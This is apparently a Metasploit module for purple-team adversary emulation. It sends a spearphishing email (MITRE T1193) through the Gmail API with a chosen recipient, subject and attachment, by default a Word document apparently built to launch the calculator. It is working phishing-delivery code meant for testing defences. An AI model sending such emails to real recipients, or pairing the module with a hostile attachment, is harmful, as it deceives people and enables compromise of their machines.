##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require "google/apis/gmail_v1"
require "googleauth"
require "googleauth/stores/file_token_store"
require "fileutils"
require "mail"


class MetasploitModule < Msf::Auxiliary
  def initialize(info={})
    super(update_info(info,
                      'Name'          => 'SpearPhishing (T1193) Windows - Purple Team',
                      'Description'   => %q{ },
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Praetorian' ],
                      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1193' ] ],
                      'Platform'      => [ 'win' ]
                     ))
    register_options(
    [
      OptString.new("TO", [ true, "who to send to", '']),
      OptString.new("MESSAGE", [true, "email body", "TTP 1193 SpearFishing..."]),
      OptString.new("SUBJECT", [true, "email subject", "Hi from PurpleTeam"]),
      # OptEnum.new('PAYLOAD', [ true, 'Payload to send', 'DCOM-Calc', ["DCOM-Calc", "Invoice-Calc"]] )
      OptString.new("ATTACHMENT", [true, "path to attachment", "data/purple/t1193/DCOM-calc.doc"])
    ])
  end


  def run
    begin
      oob_uri = 'urn:ietf:wg:oauth:2.0:oob'.freeze
      application_name = 'Gmail API Ruby Quickstart'.freeze
      credentials_path = 'data/purple/t1193/credentials.json'.freeze
      # The file token.yaml stores the user's access and refresh tokens, and is
      # created automatically when the authorization flow completes for the first
      # time.
      token_path = 'data/purple/t1193/token.yaml'.freeze
      scope = Google::Apis::GmailV1::AUTH_GMAIL_COMPOSE

      # Initialize the API
      service = Google::Apis::GmailV1::GmailService.new
      service.client_options.application_name = application_name


      client_id = Google::Auth::ClientId.from_file(credentials_path)
      token_store = Google::Auth::Stores::FileTokenStore.new(file: token_path)
      authorizer = Google::Auth::UserAuthorizer.new(client_id, scope, token_store)
      user_id = 'default'
      credentials = authorizer.get_credentials(user_id)
      if credentials.nil?
        url = authorizer.get_authorization_url(base_url: oob_uri)
        puts 'open the following url in the browser and enter the ' \
             "resulting code after authorization:\n" + url
        code = gets
        credentials = authorizer.get_and_store_credentials_from_code(
          user_id: user_id, code: code, base_url: oob_uri
        )
      end

      # Initialize the API
      service = Google::Apis::GmailV1::GmailService.new
      service.client_options.application_name = application_name
      service.authorization = credentials


      # send the message
      m = Mail.new(
        to: "#{datastore['TO']}",
        from: "purpleteamautomation@gmail.com",
        subject: "#{datastore['SUBJECT']}",
        body: "#{datastore['MESSAGE']}"
      )

      # add the payload TODO
      # if datastore['PAYLOAD'] == "DCOM-Calc"
      #   m.add_file("data/purple/windows/t1193/DCOM-calc.doc")
      # else
      #   m.add_file("data/purple/windows/t1193/Invoice-calc.doc")
      # end
      m.add_file(datastore["ATTACHMENT"])

      test = Google::Apis::GmailV1::Message.new(raw:m.to_s)
      service.send_user_message('me', test)
      print_status("Message Sent")
      print_good("Module T1193 execution successful.")
    end
  rescue ::Exception => e
    print_error("#{e.class}: #{e.message}")
    print_error("Module T1193 execution failed.")
  end
end
